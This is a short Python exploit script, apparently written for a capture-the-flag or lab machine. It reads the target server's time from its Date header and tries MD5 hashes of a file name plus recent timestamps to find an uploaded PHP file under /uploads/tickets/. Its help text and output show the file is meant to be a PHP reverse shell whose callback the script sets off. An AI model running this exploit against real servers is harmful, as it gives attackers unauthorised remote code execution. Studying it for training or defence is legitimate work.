#!/usr/bin/python3
# Creator: brutuspt

import hashlib
import time
import sys
import requests
import datetime
import calendar
import argparse

parser = argparse.ArgumentParser(description='Process some integers.')
parser.add_argument("-t", "--target", help="Target Domain Name/IP", required=True)
parser.add_argument("-f", "--file", help="File to Upload (e.g. PHP rev shell", required=True)


args = parser.parse_args()

s = requests.Session()
req = s.get(args.target)

def get_server_time():
    
    # My strategy (mine ends up being one hour late, idk why, is it my computer??)
    time_split = str(datetime.datetime.strptime(req.headers['date'], '%a, %d %b %Y %H:%M:%S %Z')).split(" ")
    year = int(time_split[0].split("-")[0])
    month = int(time_split[0].split("-")[1][1])
    day = int(time_split[0].split("-")[2])
    hour = int(time_split[1].split(":")[0])
    minutes = int(time_split[1].split(":")[1])
    seconds = int(time_split[1].split(":")[2])
    
    #return(int(datetime.datetime(year,month,day,hour,minutes,seconds).strftime('%s')))
    
    # ippsec strategy 
    serverTime = req.headers['date']
    timeFormat = "%a, %d %b %Y %H:%M:%S %Z"
    currentTime = int(calendar.timegm(time.strptime(serverTime, timeFormat)))
    return currentTime

def get_file(target, server_time, file_name):
    
    for x in range(0, 90):
        possible_file_name = file_name + str(server_time - x)

        #obtain the MD% hash of the combination of name file and the time when it was submitted
        md5hash = hashlib.md5(possible_file_name.encode('utf-8')).hexdigest()
        
        # in here I've decided to be more specific and provide the file extension as a php already, but it can be automized
        url = target+"/uploads/tickets/"+md5hash+'.php'
        response = s.get(url)
        if response.status_code == 200:
            print("Check your callback")
            sys.exit(0)



def main():
    server_time = get_server_time()
    #print(server_time)
    get_file(args.target, server_time, args.file)


if __name__ == "__main__":
    main()
